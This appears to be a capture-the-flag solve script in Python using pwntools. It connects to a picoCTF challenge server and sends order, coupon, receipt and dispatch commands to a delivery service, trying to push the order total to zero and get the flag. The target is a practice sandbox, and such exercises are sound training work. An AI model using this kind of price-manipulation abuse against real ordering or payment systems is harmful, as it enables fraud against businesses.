#!/usr/bin/env python3
"""Try coupon=hops to make total=0, look for flag."""
from pwn import *
import sys, io, time
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')

context.log_level = "error"

r = remote("mysterious-sea.picoctf.net", 59623)
r.recv(timeout=2)

def cmd(c, wait=0.5):
    r.sendline(c.encode() if isinstance(c, str) else c)
    time.sleep(wait)
    try:
        return r.recv(timeout=2).decode(errors="replace")
    except EOFError:
        return "[EOF]"

print(cmd("load city1.map"))
print(cmd("add_order 5 5"))
out = cmd("coupon 0 14")
print("coupon 0 14:", out)
out = cmd("receipt 0")
print("receipt 0:", out)
out = cmd("dispatch 0", wait=4)
print("dispatch 0:", out)
r.close()
